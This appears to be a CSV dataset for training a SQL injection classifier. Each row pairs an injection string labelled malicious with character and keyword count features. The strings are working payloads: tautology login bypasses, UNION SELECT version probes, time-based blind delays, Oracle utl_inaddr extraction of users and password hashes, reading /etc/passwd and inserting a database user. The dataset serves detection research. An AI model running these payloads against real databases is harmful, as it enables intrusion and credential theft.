,Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
15," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  5   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,81,16,3,0,14,1,0,16,1,1,3,0,0,40,3,0,2
17," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
19,distinct,1,8,1,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0
20,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,66,18,3,0,11,1,0,17,0,1,4,0,0,24,4,0,1
21,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,134,28,2,0,14,0,0,27,0,1,0,0,0,60,7,0,2
22,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,58,16,0,0,7,1,0,15,0,2,3,0,0,26,4,0,1
23,"admin"" or ""1""  =  ""1""--",1,23,5,0,5,8,1,0,4,0,1,2,0,0,7,2,0,0
24," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
25,insert,1,6,1,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0
26," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,65,18,0,1,9,1,0,18,0,2,3,0,0,26,6,0,1
27," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
28," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  8   )    )    and 'i'  =  'i",1,209,35,3,0,23,0,0,35,0,2,0,0,0,113,2,0,2
29," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
30,"or 1  =  1 or """"  =  ",1,21,7,0,2,4,0,0,7,0,1,0,0,0,4,2,0,0
31,/**/or/**/1/**/  =  /**/1,1,25,3,0,0,17,0,4,2,0,0,8,0,0,2,2,0,0
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,79,15,3,0,13,1,0,15,0,1,4,0,0,40,3,0,2
34," select * from users where id  =  '1' union select +\.,@@version -- 1'",1,70,13,3,0,12,1,0,13,0,0,4,0,0,40,2,0,2
35,or 1  =  1/*,1,12,4,0,0,3,0,1,3,0,0,0,0,0,2,2,0,0
36,%27 or 1  =  1,1,14,5,0,0,2,0,0,4,1,1,0,0,0,2,4,0,0
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
38," select * from users where id  =  '1' union select $*$,@@version -- 1'",1,70,13,3,0,13,1,0,13,0,0,4,0,0,40,2,0,2
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,62,8,0,0,16,0,0,7,0,0,0,0,0,12,21,1,0
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@version -- 1'",1,81,18,3,0,12,1,0,18,0,1,3,0,0,42,5,0,2
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,58,16,0,0,7,1,0,15,0,2,3,0,0,26,5,0,1
42," select * from users where id  =  '1' or \<\ union select 1,@@version -- 1'",1,75,15,3,0,11,1,0,15,0,1,3,0,0,42,3,0,2
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,76,15,0,0,9,1,0,15,0,1,3,0,0,40,4,0,2
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,103,20,0,0,9,1,0,20,0,1,3,1,0,66,4,1,2
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,61,16,3,0,10,1,0,15,0,2,3,0,0,26,4,0,1
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
49,or 1 --',1,8,3,1,0,3,1,0,2,0,0,2,0,0,2,1,0,0
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
51,"admin"" or 1  =  1#",1,18,5,0,1,3,0,0,4,0,1,0,0,0,7,2,0,0
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,112,23,0,0,10,1,0,23,0,0,4,1,0,66,4,1,2
53,\x27union select,1,16,2,0,0,0,0,0,1,0,0,0,0,0,12,2,0,1
54,print,1,5,1,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0
55," select * from users where id  =  '1' union select   (  \.  )  ,@@version -- 1'",1,79,16,3,0,13,1,0,16,0,0,3,0,0,40,2,0,2
56,or 1  =  1--,1,12,4,0,0,3,1,0,3,0,0,2,0,0,2,2,0,0
57,1 or pg_sleep  (  __time__  )  --,1,33,7,0,0,9,1,0,6,0,1,2,0,0,13,1,0,0
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
59,admin'  )   or   (  '1'  =  '1'/*,1,33,7,5,0,10,0,1,6,0,1,0,0,0,7,2,0,0
60,or 2 between 1 and 3,1,20,6,0,0,0,0,0,5,0,1,0,0,0,12,3,0,0
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,69,20,0,2,10,1,0,20,0,2,3,0,0,26,5,0,1
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
63,admin' or '1'  =  '1,1,20,5,4,0,5,0,0,4,0,1,0,0,0,7,2,0,0
64,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,69,13,4,0,14,1,0,12,0,1,2,0,0,35,3,0,1
65," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,96,19,0,0,7,1,0,19,0,0,3,0,0,62,4,0,2
66,""" or 0  =  0 --",1,15,6,0,1,4,1,0,5,0,1,2,0,0,2,2,0,0
67," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,76,16,0,0,10,1,0,16,0,0,3,0,0,40,2,0,2
68,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,0,1,3,0,0,24,4,0,1
69," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
70," select * from users where id  =  1 + $+*$ union select null,@@version -- 1",1,75,15,0,0,12,1,0,15,0,0,5,1,0,44,2,1,2
71," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
72,char%4039%41%2b%40select,1,24,1,0,0,4,0,0,0,4,0,0,0,0,11,9,1,0
73," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
74,admin'  )   or   (  '1'  =  '1,1,30,7,4,0,7,0,0,6,0,1,0,0,0,7,2,0,0
75,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,62,11,0,0,8,0,0,10,0,0,0,0,1,24,10,1,1
76,"or 0  =  0 #""",1,13,5,0,1,3,0,0,4,0,0,0,0,0,2,2,0,0
77," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
78,  )   or   (  'x'  =  'x,1,24,6,3,0,6,0,0,6,0,1,0,0,0,4,0,0,0
79," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,77,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
80,$  (  sleep 50  ) ,1,18,5,0,0,3,0,0,5,0,0,0,0,0,5,2,0,0
81," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,102,20,0,0,8,1,0,20,0,0,4,1,0,66,4,1,2
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,76,12,2,0,11,1,0,11,0,0,2,0,0,43,7,0,1
83," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,83,17,2,1,12,1,0,17,0,1,3,0,0,43,3,0,2
84," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
85," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,59,16,0,1,8,1,0,16,0,2,3,0,0,26,5,0,1
86,"""a"""" or 1  =  1--""",1,18,5,0,4,7,1,0,4,0,1,2,0,0,3,2,0,0
87," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,99,20,0,0,8,1,0,20,0,0,4,0,0,62,5,0,2
88," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  4   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
89," select * from users where id  =  '1' union select   (  \  )  ,@@version -- 1'",1,78,16,3,0,12,1,0,16,0,0,3,0,0,40,2,0,2
90,1 and user_name  (    )     =   'dbo',1,37,7,2,0,6,0,0,6,0,1,0,0,0,14,1,0,0
91,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,100,19,2,0,19,1,0,18,0,1,2,0,0,39,7,0,1
92," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,81,17,0,1,10,1,0,17,0,1,3,0,0,42,4,0,2
93," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,84,17,0,1,10,1,0,17,0,1,3,1,0,46,3,1,2
94,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,58,16,3,0,11,1,0,15,0,1,4,0,0,24,4,0,1
95,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,0,1,5,0,0,24,4,0,1
96,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,72,20,0,0,9,1,0,19,0,2,4,0,0,26,5,0,1
97," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  6   )    )    and 'i'  =  'i",1,213,35,3,0,23,0,0,35,0,2,0,0,0,117,2,0,2
98,or 1  =  1 or ''  =  ',1,22,8,3,0,5,0,0,7,0,1,0,0,0,4,2,0,0
99,select * from users where id  =  1   or 1  =  1 -- 1,1,52,14,0,0,5,1,0,13,0,1,3,0,0,24,4,0,1
100,or 'text' > 't',1,15,4,4,0,5,0,0,3,0,0,0,0,0,7,0,0,0
101,"1234 "" and 1  =  0 union all select ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,78,11,0,4,6,0,0,10,0,1,0,0,0,35,25,0,1
102," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
103," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,87,19,0,1,11,1,0,19,0,1,3,0,0,42,5,0,2
104,admin' or '1'  =  '1'#,1,22,5,5,0,7,0,0,4,0,1,0,0,0,7,2,0,0
105,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,55,16,0,0,7,1,0,15,0,1,4,0,0,24,5,0,1
106,s,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0
107," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  4   )    )    and 'i'  =  'i",1,213,35,3,0,23,0,0,35,0,2,0,0,0,117,2,0,2
108, select * from information_schema.tables--,1,42,4,0,0,5,1,0,4,0,0,3,0,0,33,0,0,1
109," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
110,1   )    )    or pg_sleep  (  __time__  )  --,1,45,9,0,0,11,1,0,8,0,1,2,0,0,13,1,0,0
111," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,78,15,3,0,13,1,0,15,0,1,3,0,0,40,2,0,2
112,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,62,11,0,0,8,0,0,10,0,0,0,0,1,24,10,1,1
113, or 1  =  1 or ''  =  ',1,23,8,3,0,5,0,0,8,0,2,0,0,0,4,2,0,0
114,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,55,15,0,0,8,1,0,14,1,2,3,0,0,24,5,0,1
115,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec  (  @q  ) ,1,158,14,0,0,8,0,0,14,0,0,0,0,1,33,90,1,1
116," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
117," select * from users where id  =  1 or $+<1 union select 1,@@version -- 1",1,73,15,0,0,10,1,0,15,0,1,4,0,0,42,4,0,2
118,or 'unusual'   =   'unusual',1,28,4,4,0,5,0,0,3,0,0,0,0,0,16,0,0,0
119, or 1 in   (  select @@version  )  --,1,37,8,0,0,6,1,0,8,0,1,2,0,0,17,1,0,1
120,truncate,1,8,1,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0
121,as,1,2,1,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0
122, or 3  =  3 --,1,15,6,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0
123," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,100,20,0,0,9,1,0,20,0,1,3,0,0,62,5,0,2
124," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
125,"admin""  )   or   (  ""1""  =  ""1",1,30,7,0,4,7,0,0,6,0,1,0,0,0,7,2,0,0
126," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,83,17,2,1,12,1,0,17,0,1,3,0,0,43,3,0,2
127,"1  )   or benchmark  (  10000000,md5  (  1   )    )   #",1,55,11,0,0,7,0,0,10,0,1,0,0,0,13,11,0,0
128," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,75,15,0,0,9,1,0,15,0,0,3,0,0,40,3,0,2
129, and 1  =  utl_inaddr.get_host_address   (    (   select sys.database_name from dual   )    )    and 'i'  =  'i,1,111,16,3,0,15,0,0,16,0,2,0,0,0,60,1,0,1
130," or 0  =  0 #""",1,14,5,0,1,3,0,0,5,0,1,0,0,0,2,2,0,0
131,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,55,16,0,0,7,1,0,15,1,1,3,0,0,24,5,0,1
132,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,55,15,0,0,9,1,0,14,1,2,3,0,0,24,4,0,1
133,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,100,19,2,0,19,1,0,18,0,1,2,0,0,39,7,0,1
134,1  )   or sleep  (  __time__  )  #,1,34,8,0,0,8,0,0,7,0,1,0,0,0,11,1,0,0
135," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
136," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,78,16,0,0,10,1,0,16,0,0,3,0,0,40,4,0,2
137," select * from users where id  =  1 + $+*\ union select null,@@version -- 1",1,75,15,0,0,11,1,0,15,0,0,5,1,0,44,2,1,2
138,select * from users where id  =  1. <@ or 1  =  1 -- 1,1,54,15,0,0,8,1,0,14,0,1,3,0,0,24,4,0,1
139, or true--,1,10,2,0,0,2,1,0,2,0,1,2,0,0,6,0,0,0
140,; execute immediate 'sel' || 'ect us' || 'er',1,45,9,6,0,11,0,0,8,0,2,0,0,0,26,0,0,0
141,hi' or 'x'  =  'x';,1,19,5,5,0,7,0,0,4,0,1,0,0,0,6,0,0,0
142,select * from users where id  =  1 <@ or 1  =  1 -- 1,1,53,15,0,0,7,1,0,14,0,1,3,0,0,24,4,0,1
143," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
144,admin' #,1,8,2,1,0,2,0,0,1,0,0,0,0,0,5,0,0,0
145," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,78,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
146," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
147," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
148," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,55,7,2,0,12,0,0,7,0,0,2,0,0,28,4,0,1
149,"""  )  ;waitfor delay '0:0:__time__'--",1,37,5,2,1,13,1,0,4,0,0,2,0,0,16,2,0,0
150, or 'unusual'   =   'unusual',1,29,4,4,0,5,0,0,4,0,1,0,0,0,16,0,0,0
151,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,121,17,6,0,17,0,0,17,0,0,0,0,0,66,3,0,0
152,"admin"" or ""1""  =  ""1""/*",1,23,5,0,5,8,0,1,4,0,1,0,0,0,7,2,0,0
153," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,69,20,0,2,9,1,0,20,0,2,3,0,0,26,6,0,1
154," select * from users where id  =  1 or \<1 union select 1,@@version -- 1",1,72,15,0,0,8,1,0,15,0,1,3,0,0,42,4,0,2
155,like,1,4,1,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0
156,or username like char  (  37  )  ;,1,34,8,0,0,3,0,0,7,0,0,0,0,0,18,2,1,0
157, )    )    or pg_sleep  (  __time__  )  --,1,42,8,0,0,11,1,0,8,0,1,2,0,0,13,0,0,0
158,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,58,16,0,0,8,1,0,15,0,2,4,0,0,26,4,0,1
159,or 3  =  3,1,10,4,0,0,1,0,0,3,0,0,0,0,0,2,2,0,0
160," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
161,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,72,20,0,0,10,1,0,19,0,2,4,0,0,26,5,0,1
162,exec sp,1,7,2,0,0,0,0,0,1,0,0,0,0,0,6,0,0,0
163," select * from users where id  =  1 or \+<$ union select 1,@@version -- 1",1,73,15,0,0,10,1,0,15,0,1,4,0,0,42,3,0,2
164,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,57,16,0,0,7,1,0,15,0,2,3,0,0,26,4,0,1
165," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,77,15,0,0,10,1,0,15,0,1,3,0,0,40,4,0,2
166,admin' or 1  =  1/*,1,19,5,1,0,4,0,1,4,0,1,0,0,0,7,2,0,0
167,a' waitfor delay '0:0:10'--,1,27,4,3,0,7,1,0,3,0,0,2,0,0,13,4,0,0
168," select * from users where id  =  1 +  (  \  )   union select null,@@version -- 1",1,81,17,0,0,10,1,0,17,0,0,4,1,0,44,2,1,2
169," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
170,and 1 in   (  select var from temp  )  --,1,41,10,0,0,4,1,0,9,0,0,2,0,0,22,1,0,1
171,hi'  )   or   (  'a'  =  'a,1,27,7,4,0,7,0,0,6,0,1,0,0,0,6,0,0,0
172," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  1   )    )    and 'i'  =  'i",1,221,35,3,0,25,0,0,35,0,2,0,0,0,123,2,0,2
173,"admin"" or 1  =  1",1,17,5,0,1,2,0,0,4,0,1,0,0,0,7,2,0,0
174,"""  )   or true--",1,16,4,0,1,4,1,0,3,0,1,2,0,0,6,0,0,0
175," select * from users where id  =  '1' or $ .  =  1 union select 1,@@version -- 1'",1,81,18,3,0,13,1,0,18,0,1,3,0,0,42,4,0,2
176," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
177,1  )   or pg_sleep  (  __time__  )  --,1,38,8,0,0,10,1,0,7,0,1,2,0,0,13,1,0,0
178," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
179,"""  )   or sleep  (  __time__  )    =  """,1,39,9,0,2,10,0,0,8,0,1,0,0,0,11,0,0,0
180,select * from users where id  =  1.<@. or 1  =  1 -- 1,1,54,14,0,0,9,1,0,13,0,1,3,0,0,24,4,0,1
181,"admin""  )   or   (  ""1""  =  ""1""--",1,33,7,0,5,10,1,0,6,0,1,2,0,0,7,2,0,0
182," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,77,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
183,; exec xp_regread,1,17,3,0,0,2,0,0,2,0,0,0,0,0,13,0,0,0
184," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,82,18,3,0,12,1,0,18,0,0,4,0,0,40,4,0,2
185,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,57,16,0,0,8,1,0,15,1,1,5,0,0,24,5,0,1
186," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,59,16,0,2,8,1,0,16,0,2,3,0,0,26,5,0,1
187," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,1,2,3,0,0,26,4,0,1
188,1 and 1  =  1,1,13,5,0,0,1,0,0,4,0,1,0,0,0,3,3,0,0
189,or 0  =  0 #,1,12,5,0,0,2,0,0,4,0,0,0,0,0,2,2,0,0
190,union select * from users where login   =   char ...,1,52,10,0,0,5,0,0,9,0,0,1,0,0,34,0,1,1
191," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,76,15,0,0,10,1,0,15,0,1,3,0,0,40,3,0,2
192,admin'  )   or '1'  =  '1'--,1,28,6,5,0,9,1,0,5,0,1,2,0,0,7,2,0,0
193,1;select *,1,10,2,0,0,2,0,0,1,0,0,1,0,0,6,1,0,0
194," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
195,x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,63,15,1,0,10,1,0,14,0,1,3,0,0,26,1,0,2
196," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,84,17,3,2,14,1,0,17,0,1,3,0,0,42,3,0,2
197," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,59,16,0,2,9,1,0,16,0,2,3,0,0,26,4,0,1
198," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,103,20,3,0,12,1,0,20,0,1,3,0,0,62,5,0,2
199,"1 or benchmark  (  10000000,md5  (  1   )    )   #",1,50,10,0,0,6,0,0,9,0,1,0,0,0,13,11,0,0
200,procedure,1,9,1,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0
201,or ''  =  ',1,11,4,3,0,4,0,0,3,0,0,0,0,0,2,0,0,0
202, and 1  =  utl_inaddr.get_host_address   (    (   select sys.login_user from dual   )    )    and 'i'  =  'i,1,108,16,3,0,15,0,0,16,0,2,0,0,0,57,1,0,1
203," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  2   )    )    and 'i'  =  'i",1,213,35,3,0,23,0,0,35,0,2,0,0,0,117,2,0,2
204,\'; desc users; --,1,18,4,1,0,5,1,0,3,0,0,2,0,0,9,0,0,0
205," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@version -- 1",1,87,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
206,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,66,19,3,0,10,1,0,18,0,2,3,0,0,26,6,0,1
